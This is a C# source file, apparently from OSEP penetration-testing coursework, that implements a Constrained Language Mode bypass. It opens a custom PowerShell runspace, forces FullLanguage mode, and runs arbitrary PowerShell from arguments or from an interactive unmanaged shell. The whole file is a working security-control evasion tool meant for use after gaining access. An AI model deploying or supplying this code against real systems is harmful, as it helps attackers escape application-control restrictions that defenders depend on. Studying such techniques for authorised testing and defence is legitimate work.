using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace OSEP
{
    public class CLMBypass
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("[*] OSEP Unmanaged PowerShell Runner (CLM Bypass)");

            try
            {
                // 1. Create a custom Runspace
                // Custom hosts like this start in FullLanguage mode by default.
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();

                // 2. Explicitly ensure FullLanguage mode
                rs.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;

                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                Console.WriteLine("[+] FullLanguage Runspace Initialized.");
                
                if (args.Length > 0)
                {
                    // Execute specific command if provided via /ARGS
                    string cmd = string.Join(" ", args);
                    Console.WriteLine("[*] Executing Command: {0}", cmd);
                    ps.AddScript(cmd);
                    InvokeAndPrint(ps);
                }
                else
                {
                    // Interactive Unmanaged Shell
                    Console.WriteLine("[*] Entering Interactive Shell. Type 'exit' to quit.");
                    while (true)
                    {
                        Console.Write("PS-UNMANAGED> ");
                        string input = Console.ReadLine();
                        if (string.IsNullOrEmpty(input) || input.ToLower() == "exit") break;

                        ps.AddScript(input);
                        InvokeAndPrint(ps);
                        ps.Commands.Clear();
                    }
                }

                rs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] FATAL ERROR: {0}", ex.Message);
            }
        }

        private static void InvokeAndPrint(PowerShell ps)
        {
            try
            {
                Collection<PSObject> results = ps.Invoke();
                foreach (var obj in results)
                {
                    if (obj != null) Console.WriteLine(obj.ToString());
                }
                // Report PowerShell internal errors if any
                if (ps.Streams.Error.Count > 0)
                {
                    foreach (var err in ps.Streams.Error)
                    {
                        Console.WriteLine("[-] PS ERROR: " + err.ToString());
                    }
                    ps.Streams.Error.Clear();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] EXECUTION ERROR: {0}", ex.Message);
            }
        }
    }
}
